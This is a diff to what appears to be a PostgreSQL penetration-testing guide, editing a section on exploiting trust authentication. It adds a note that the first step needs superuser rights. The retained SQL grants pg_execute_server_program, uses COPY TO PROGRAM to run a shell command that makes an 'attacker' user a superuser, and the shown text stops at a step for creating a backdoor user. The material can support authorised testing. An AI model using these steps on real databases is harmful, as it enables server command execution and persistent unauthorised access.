@@ -132,13 +132,15 @@ host    all       all   0.0.0.0/0     scram-sha-256
 
 **Exploiting Trust Authentication:**
 
-If local trust authentication is configured:
+If local trust authentication is configured and you have superuser access (or can exploit trust auth to gain it):
+
+**Note:** `GRANT pg_execute_server_program` requires superuser privileges. The workflow below assumes you have already obtained elevated access (e.g., via trust authentication allowing passwordless superuser login, or existing superuser credentials). Without superuser, the GRANT will fail.
 
 ```sql
--- First, get command execution capability
+-- Requires superuser: grant command execution capability
 GRANT pg_execute_server_program TO current_user;
 
--- Connect locally as superuser without password
+-- Then use COPY TO PROGRAM (requires pg_execute_server_program role)
 COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER"';
 
 -- Or create a backdoor user
